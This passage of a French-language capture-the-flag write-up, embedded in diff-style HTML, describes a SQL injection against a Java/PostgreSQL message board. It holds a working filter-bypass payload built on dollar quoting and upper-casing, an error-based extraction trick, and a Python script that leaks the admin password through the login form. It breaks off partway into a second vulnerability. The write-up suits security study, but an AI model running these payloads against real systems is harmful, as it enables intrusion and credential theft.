+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;SELECT&#34;</span>,<span style="color:#e6db74">&#34;UNION&#34;</span>,<span style="color:#e6db74">&#34;INSERT&#34;</span>,<span style="color:#e6db74">&#34;ALTER&#34;</span>,<span style="color:#e6db74">&#34;SLEEP&#34;</span>,<span style="color:#e6db74">&#34;DELETE&#34;</span>,<span style="color:#e6db74">&#34;--&#34;</span>,<span style="color:#e6db74">&#34;;&#34;&#34;,&#34;</span><span style="color:#75715e">#&#34;,&#34;&amp;&#34;,&#34;/*&#34;, </span>
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;OR&#34;</span>,<span style="color:#e6db74">&#34;EXEC&#34;</span>,<span style="color:#e6db74">&#34;CREATE&#34;</span>,<span style="color:#e6db74">&#34;AND&#34;</span>,<span style="color:#e6db74">&#34;DROP&#34;</span>,<span style="color:#e6db74">&#34;DO&#34;</span>,<span style="color:#e6db74">&#34;COPY&#34;</span>,<span style="color:#e6db74">&#34;SET&#34;</span>,<span style="color:#e6db74">&#34;VACUUM&#34;</span>,<span style="color:#e6db74">&#34;SHOW&#34;</span>,<span style="color:#e6db74">&#34;CURSOR&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;TRUNCATE&#34;</span>,<span style="color:#e6db74">&#34;CAST&#34;</span>,<span style="color:#e6db74">&#34;BEGIN&#34;</span>,<span style="color:#e6db74">&#34;PERFORM&#34;</span>,<span style="color:#e6db74">&#34;END&#34;</span>,<span style="color:#e6db74">&#34;CASE&#34;</span>,<span style="color:#e6db74">&#34;WHEN&#34;</span>,<span style="color:#e6db74">&#34;ALL&#34;</span>,<span style="color:#e6db74">&#34;TABLE&#34;</span>,<span style="color:#e6db74">&#34;UPDATE&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;TRIGGER&#34;</span>,<span style="color:#e6db74">&#34;FUNCTION&#34;</span>,<span style="color:#e6db74">&#34;PROCEDURE&#34;</span>,<span style="color:#e6db74">&#34;DECLARE&#34;</span>,<span style="color:#e6db74">&#34;RETURNING&#34;</span>,<span style="color:#e6db74">&#34;TABLESPACE&#34;</span>,<span style="color:#e6db74">&#34;VIEW&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;SEQUENCE&#34;</span>,<span style="color:#e6db74">&#34;INDEX&#34;</span>,<span style="color:#e6db74">&#34;LOCK&#34;</span>,<span style="color:#e6db74">&#34;GRANT&#34;</span>,<span style="color:#e6db74">&#34;REVOKE&#34;</span>,<span style="color:#e6db74">&#34;SAVEPOINT&#34;</span>,<span style="color:#e6db74">&#34;ROLLBACK&#34;</span>,<span style="color:#e6db74">&#34;IMPORT&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;COMMIT&#34;</span>,<span style="color:#e6db74">&#34;PREPARE&#34;</span>,<span style="color:#e6db74">&#34;EXECUTE&#34;</span>,<span style="color:#e6db74">&#34;EXPLAIN&#34;</span>,<span style="color:#e6db74">&#34;ANALYZE&#34;</span>,<span style="color:#e6db74">&#34;DATABASE&#34;</span>,<span style="color:#e6db74">&#34;PASSWORD&#34;</span>,<span style="color:#e6db74">&#34;CONNECT&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;DISCONNECT&#34;</span>,<span style="color:#e6db74">&#34;PG_SLEEP&#34;</span>,<span style="color:#e6db74">&#34;MERGE&#34;</span>,<span style="color:#e6db74">&#34;USING&#34;</span>,<span style="color:#e6db74">&#34;LIMIT&#34;</span>,<span style="color:#e6db74">&#34;OFFSET&#34;</span>,<span style="color:#e6db74">&#34;RETURN&#34;</span>,<span style="color:#e6db74">&#34;ESCAPE&#34;</span>,<span style="color:#e6db74">&#34;LIKE&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;ILIKE&#34;</span>,<span style="color:#e6db74">&#34;RLIKE&#34;</span>,<span style="color:#e6db74">&#34;EXISTS&#34;</span>,<span style="color:#e6db74">&#34;BETWEEN&#34;</span>,<span style="color:#e6db74">&#34;IS&#34;</span>,<span style="color:#e6db74">&#34;NULL&#34;</span>,<span style="color:#e6db74">&#34;NOT&#34;</span>,<span style="color:#e6db74">&#34;GROUP&#34;</span>,<span style="color:#e6db74">&#34;BY&#34;</span>,<span style="color:#e6db74">&#34;HAVING&#34;</span>,<span style="color:#e6db74">&#34;ORDER&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;WINDOW&#34;</span>,<span style="color:#e6db74">&#34;PARTITION&#34;</span>,<span style="color:#e6db74">&#34;OVER&#34;</span>,<span style="color:#e6db74">&#34;FOREIGN KEY&#34;</span>,<span style="color:#e6db74">&#34;REFERENCE&#34;</span>,<span style="color:#e6db74">&#34;RAISE&#34;</span>,<span style="color:#e6db74">&#34;LISTEN&#34;</span>,<span style="color:#e6db74">&#34;NOTIFY&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;LOAD&#34;</span>,<span style="color:#e6db74">&#34;SECURITY&#34;</span>,<span style="color:#e6db74">&#34;OWNER&#34;</span>,<span style="color:#e6db74">&#34;RULE&#34;</span>,<span style="color:#e6db74">&#34;CLUSTER&#34;</span>,<span style="color:#e6db74">&#34;COMMENT&#34;</span>,<span style="color:#e6db74">&#34;CONVERT&#34;</span>,<span style="color:#e6db74">&#34;COPY&#34;</span>,<span style="color:#e6db74">&#34;CHECKPOINT&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;REINDEX&#34;</span>,<span style="color:#e6db74">&#34;RESET&#34;</span>,<span style="color:#e6db74">&#34;LANGUAGE&#34;</span>,<span style="color:#e6db74">&#34;PLPGSQL&#34;</span>,<span style="color:#e6db74">&#34;PLPYTHON&#34;</span>,<span style="color:#e6db74">&#34;SECDEF&#34;</span>,<span style="color:#e6db74">&#34;NOCREATEDB&#34;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;NOCREATEROLE&#34;</span>,<span style="color:#e6db74">&#34;NOINHERIT&#34;</span>,<span style="color:#e6db74">&#34;NOREPLICATION&#34;</span>,<span style="color:#e6db74">&#34;BYPASSRLS&#34;</span>,<span style="color:#e6db74">&#34;FILE&#34;</span>,<span style="color:#e6db74">&#34;PG_&#34;</span>,<span style="color:#e6db74">&#34;IMPORT&#34;</span>,<span style="color:#e6db74">&#34;EXPORT&#34;</span>
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>Cette vérification nous empêche les injections classique du type: <code>' OR 1=1 -- </code>.</p>
+<p>De plus, la 2nd vérification appele la méthode <code>check</code> de la class <code>SQLCheck</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">check</span>(String sql) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> checkValid(sql.<span style="color:#a6e22e">toUpperCase</span>());
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>qui elle même appele <em>checkValid</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">filter</span>(String sql) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (StringUtil.<span style="color:#a6e22e">matches</span>(sql, <span style="color:#e6db74">&#34;^[a-zA-Z0-9_]*$&#34;</span>) <span style="color:#f92672">||</span> sql.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34; USER_DEFINE &#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sql.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;SELECT&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> sql.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;VIEW&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String whitePrefix : getWhitePrefix().<span style="color:#a6e22e">stream</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sql.<span style="color:#a6e22e">startsWith</span>(whitePrefix)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">checkValid</span>(String sql) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> SQLParser.<span style="color:#a6e22e">parse</span>(sql);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (SQLException e) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            List<span style="color:#f92672">&lt;</span>SQLStatement<span style="color:#f92672">&gt;</span> sqlStatements <span style="color:#f92672">=</span> SQLUtils.<span style="color:#a6e22e">parseStatements</span>(sql, JdbcConstants.<span style="color:#a6e22e">POSTGRESQL</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (sqlStatements <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> sqlStatements.<span style="color:#a6e22e">size</span>() <span style="color:#f92672">&gt;</span> 1) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (SQLStatement statement : sqlStatements.<span style="color:#a6e22e">stream</span>()) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (statement <span style="color:#66d9ef">instanceof</span> PGSelectStatement) {
+</span></span><span style="display:flex;"><span>                    SQLSelect sqlSelect <span style="color:#f92672">=</span> ((SQLSelectStatement) statement).<span style="color:#a6e22e">getSelect</span>();
+</span></span><span style="display:flex;"><span>                    SQLSelectQuery sqlSelectQuery <span style="color:#f92672">=</span> sqlSelect.<span style="color:#a6e22e">getQuery</span>();
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (sqlSelectQuery <span style="color:#66d9ef">instanceof</span> SQLUnionQuery) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    SQLSelectQueryBlock sqlSelectQueryBlock <span style="color:#f92672">=</span> (SQLSelectQueryBlock) sqlSelectQuery;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>filtetFields(sqlSelectQueryBlock.<span style="color:#a6e22e">getSelectList</span>()) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>filterTableName((SQLExprTableSource) sqlSelectQueryBlock.<span style="color:#a6e22e">getFrom</span>()).<span style="color:#a6e22e">booleanValue</span>()) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>filterWhere(sqlSelectQueryBlock.<span style="color:#a6e22e">getWhere</span>())) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e2) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (filter(sql)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> SQLException(<span style="color:#e6db74">&#34;SQL Parsing Exception~&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Nous allons donc chercher à exfiltrer le mot de passe administrateur via la SQLI en abusant du fonctionnement de la fonction <em>checkValid</em></p>
+<p>La première chose qu&rsquo;il faut remarquer et que la fonction <strong>filter</strong> est assez peu strict et que si la requète contient <code>USER_DEFINE</code> et <code>SELECT</code>, la requète sera considérée comme sûr !</p>
+<p>Pour atteindre l&rsquo;appel à cette fonction <strong>filter</strong>, nous devons d&rsquo;abord faire crasher deux blocs de code afin d&rsquo;atteindre deux fois les <strong>catch</strong>.</p>
+<p>Le premier catch à déclencher est celui ci:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> SQLParser.<span style="color:#a6e22e">parse</span>(sql);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (SQLException e) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Do some juicy code</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Le seconde catch à déclencher:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    List<span style="color:#f92672">&lt;</span>SQLStatement<span style="color:#f92672">&gt;</span> sqlStatements <span style="color:#f92672">=</span> SQLUtils.<span style="color:#a6e22e">parseStatements</span>(sql, JdbcConstants.<span style="color:#a6e22e">POSTGRESQL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sqlStatements <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> sqlStatements.<span style="color:#a6e22e">size</span>() <span style="color:#f92672">&gt;</span> 1) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (SQLStatement statement : sqlStatements.<span style="color:#a6e22e">stream</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (statement <span style="color:#66d9ef">instanceof</span> PGSelectStatement) {
+</span></span><span style="display:flex;"><span>            SQLSelect sqlSelect <span style="color:#f92672">=</span> ((SQLSelectStatement) statement).<span style="color:#a6e22e">getSelect</span>();
+</span></span><span style="display:flex;"><span>            SQLSelectQuery sqlSelectQuery <span style="color:#f92672">=</span> sqlSelect.<span style="color:#a6e22e">getQuery</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (sqlSelectQuery <span style="color:#66d9ef">instanceof</span> SQLUnionQuery) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            SQLSelectQueryBlock sqlSelectQueryBlock <span style="color:#f92672">=</span> (SQLSelectQueryBlock) sqlSelectQuery;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>filtetFields(sqlSelectQueryBlock.<span style="color:#a6e22e">getSelectList</span>()) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>filterTableName((SQLExprTableSource) sqlSelectQueryBlock.<span style="color:#a6e22e">getFrom</span>()).<span style="color:#a6e22e">booleanValue</span>()) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>filterWhere(sqlSelectQueryBlock.<span style="color:#a6e22e">getWhere</span>())) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (Exception e2) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// do some juicy code</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>On peut trigger les exceptions en faisant passer une requète sql invalide dans <code>sql</code>.
+En revanche, la query SQL finale doit pourtant être valide puisqu&rsquo;elle va être executé par <em>Postgresql</em> par la suite.</p>
+<p>Nous devons donc nous attarder sur le détail suivant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">check</span>(String sql) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> checkValid(sql.<span style="color:#a6e22e">toUpperCase</span>());
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>La requète SQL qui est testée est en majuscule alors que celle executée restera en minuscule.<br>
+Nous devons donc trouver une manière de forger une requète SQL invalide uniquement quand elle est mise en majuscule. <em>(sql.toUpperCase())</em></p>
+<p>D&rsquo;aprés <a href="https://www.postgresql.org/docs/8.1/sql-syntax.html" target="_blank">4.1.2.2</a>, on peut lire ceci:</p>
+<pre tabindex="0"><code>PostgreSQL provides another way, called &#34;dollar quoting&#34;, to write string constants.
+Example: 
+- $SomeTag$Dianne&#39;s horse$SomeTag$
+- $$Dianne&#39;s horse$$
+</code></pre><p>PostgreSQL nous montre qu&rsquo;il est possible de créer des constantes grâce à des $, un peu comme des balises en HTML.
+Voici un exemple:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>postgres<span style="color:#f92672">=</span><span style="color:#75715e"># SELECT ($a$ Hello $a$);</span>
+</span></span><span style="display:flex;"><span> postgres
+</span></span><span style="display:flex;"><span> ?column?
+</span></span><span style="display:flex;"><span>----------
+</span></span><span style="display:flex;"><span>  Hello
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> row<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>En reprenant le même principe, on peut forger la forger ceci:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>u$foo$U$ USER_DEFINE <span style="color:#960050;background-color:#1e0010">$</span>U$bar$u$
+</span></span></code></pre></div><p>Du point de vue de la requète en minuscule, on aura la chaine de caractère <code>&quot;foo$U$ USER_DEFINE username=$U$bar&quot;</code>.<br>
+Avec la requète en majuscule, on aura la query sql avec: <code>$U$F00$U$ USER_DEFINE $U$BAR$U$</code> ce qui sera rendu en :
+<code>&quot;FOO&quot; USER_DEFINE &quot;BAR&quot;</code>, ce qui n&rsquo;est valide pour la syntaxe SQL.</p>
+<p>Finalement, on peut ajouter un <code>SUBSTR(...,0,0)</code> pour ne pas prendre en compte la chaine de caractères <code>&quot;foo$U$ USER_DEFINE username=$U$bar&quot;</code></p>
+<p>Ainsi, en envoyer l&rsquo;username suivant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;||substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)||&#39;</span>
+</span></span></code></pre></div><p>On forge la requète suivante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> id,passwd <span style="color:#66d9ef">FROM</span> message_users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">||</span>substr(<span style="color:#960050;background-color:#1e0010">$</span>u$foo$U$ USER_DEFINE <span style="color:#960050;background-color:#1e0010">$</span>U$bar$u$,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>)<span style="color:#f92672">||</span><span style="color:#e6db74">&#39;&#39;</span>;
+</span></span></code></pre></div><p>On peut maintenant ajouter ce que l&rsquo;on veut à droite de la requète pour exfiltrer le mot de passe.<br>
+<em>(Nous sommes toujours contraint de respecter le filtre par mots clés)</em></p>
+<h4 id="exfiltration-du-mot-de-passe">Exfiltration du mot de passe</h4>
+<p>La méthode trouvé a été d&rsquo;ajouter le sufffix <code>::json</code> au mot passe afin de faire un <em>cast</em> du mot de passe de l&rsquo;administrateur en json. Le cast va provoquer une erreur qui sera renvoyé et le mot de passe sera affiché dans la stacktrace:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;||substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)||passwd::json||&#39;</span>
+</span></span></code></pre></div><p><img src="./img/screen3.png" alt="Screen3"></p>
+<p>Enfin, le mot de passe étant plus long que 7 caractères, l&rsquo;utilisation de python a permit de scripter l&rsquo;exfiltration de bloc de 7 lettres via <code>substr</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">client</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, url):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>url <span style="color:#f92672">=</span> url
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>bypass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_admin_password</span>(self, max_len<span style="color:#f92672">=</span><span style="color:#ae81ff">50</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_char</span>(position <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39;||</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>bypass<span style="color:#e6db74">}</span><span style="color:#e6db74">||SUBSTR(passwd,</span><span style="color:#e6db74">{</span>position<span style="color:#e6db74">}</span><span style="color:#e6db74">,7)::json||&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>            html <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/login&#39;</span>,data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: username,<span style="color:#e6db74">&#34;passwd&#34;</span>: <span style="color:#e6db74">&#34;x&#34;</span>})<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>            letter <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Detail: Token &amp;quot;(.*?)&amp;quot; is invalid&#34;</span>, html)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> letter <span style="color:#f92672">and</span> letter <span style="color:#f92672">!=</span> [<span style="color:#e6db74">&#39;&#39;</span>]:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> letter[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;?&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(max_len):
+</span></span><span style="display:flex;"><span>            password <span style="color:#f92672">+=</span> leak_char(position<span style="color:#f92672">=</span>len(password)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> password<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;?&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> client(url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;:8080&#39;</span>)
+</span></span><span style="display:flex;"><span>admin_passwd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>leak_admin_password()
+</span></span><span style="display:flex;"><span>print(admin_passwd)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># WeakPassdcf03cde-bc56-11ee-9acc-0242ac110017!!</span>
+</span></span></code></pre></div><h3 id="seconde-vulnérabilité-lecture-et-ecriture-de-fichier-arbitraire">Seconde vulnérabilité: Lecture et Ecriture de fichier arbitraire</h3>
+<p>Une fois connecté, on se retrouve fasse à un formulaire pour poster des messages:<br>
+<img src="./img/screen4.png" alt="Screen4"></p>
+<p>Dans le controller <strong>MessageBoardController</strong>, on retrouver le code suivant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">@RequestParam</span> String content, HttpSession session, Model model) {
+</span></span><span style="display:flex;"><span>    Integer userId <span style="color:#f92672">=</span> (Integer) session.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;userId&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (userId <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> userId.<span style="color:#a6e22e">intValue</span>() <span style="color:#f92672">==</span> 1) {
+</span></span><span style="display:flex;"><span>        String var10000 <span style="color:#f92672">=</span> userId.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>        String sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;INSERT INTO messages (user_id, content) VALUES (&#34;</span> <span style="color:#f92672">+</span> var10000 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, &#39;&#34;</span> <span style="color:#f92672">+</span> content <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;)&#34;</span>;
